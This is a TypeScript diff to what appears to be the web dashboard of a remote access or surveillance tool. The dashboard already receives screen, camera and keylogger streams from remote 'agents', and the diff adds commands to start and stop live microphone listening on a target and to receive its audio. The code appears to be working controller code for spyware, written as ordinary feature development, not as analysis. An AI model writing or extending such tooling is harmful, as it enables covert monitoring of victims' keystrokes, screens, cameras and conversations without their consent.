@@ -22,6 +22,7 @@ class DashboardSocket {
   private screenListeners: { [agentId: string]: ((frame: { data: string; w?: number; h?: number; ts?: number }) => void)[] } = {};
   private cameraListeners: { [agentId: string]: ((frame: { data: string; w?: number; h?: number; ts?: number }) => void)[] } = {};
   private keylogListeners: { [agentId: string]: ((line: string) => void)[] } = {};
+  private audioLiveListeners: { [agentId: string]: ((chunk: { pcm_b64: string; rate?: number; ch?: number; ts?: number }) => void)[] } = {};
 
   setToken(token: string | null) {
     this.token = token;
@@ -80,6 +81,10 @@ class DashboardSocket {
           const aid = d.agent_id || this.currentAgentIdForKeylog();
           const cbs = (aid && this.keylogListeners[aid]) ? this.keylogListeners[aid] : [];
           cbs.forEach((cb) => cb(d.line));
+        } else if ((data as any).type === 'audio_live') {
+          const d = data as { type: 'audio_live'; agent_id: string; pcm_b64: string; rate?: number; ch?: number; ts?: number };
+          const cbs = this.audioLiveListeners[d.agent_id] || [];
+          cbs.forEach((cb) => cb({ pcm_b64: d.pcm_b64, rate: d.rate, ch: d.ch, ts: d.ts }));
         }
       } catch (e) {
         // ignore parse error
@@ -333,6 +338,15 @@ class DashboardSocket {
     this.ws.send(JSON.stringify({ target: agentId, ...p }));
   }
 
+  // --- Audio live listen events ---
+  onAudioLive(agentId: string, cb: (chunk: { pcm_b64: string; rate?: number; ch?: number; ts?: number }) => void) {
+    if (!this.audioLiveListeners[agentId]) this.audioLiveListeners[agentId] = [];
+    this.audioLiveListeners[agentId].push(cb);
+  }
+  offAudioLive(agentId: string, cb: (chunk: { pcm_b64: string; rate?: number; ch?: number; ts?: number }) => void) {
+    this.audioLiveListeners[agentId] = (this.audioLiveListeners[agentId] || []).filter((f) => f !== cb);
+  }
+
   // --- Audio controls ---
   audioStart(agentId: string, opts?: { sample_rate?: number; channels?: number; max_seconds?: number }) {
     const p: any = { type: 'audio_start' };
@@ -357,6 +371,19 @@ class DashboardSocket {
 
   audioPlayData(agentId: string, dataUrlOrBase64: string) {
     const p: any = { type: 'audio_play_data', data: dataUrlOrBase64 };
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...p }));
+  }
+
+  audioListenStart(agentId: string, opts?: { sample_rate?: number; channels?: number }) {
+    const p: any = { type: 'audio_listen_start' };
+    if (opts?.sample_rate) p.sample_rate = opts.sample_rate;
+    if (opts?.channels) p.channels = opts.channels;
+    if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
+    this.ws.send(JSON.stringify({ target: agentId, ...p }));
+  }
+  audioListenStop(agentId: string) {
+    const p: any = { type: 'audio_listen_stop' };
     if (!this.ws || this.ws.readyState !== WebSocket.OPEN) { this.pending.push({ target: agentId, payload: p }); this.connect(); return; }
     this.ws.send(JSON.stringify({ target: agentId, ...p }));
   }
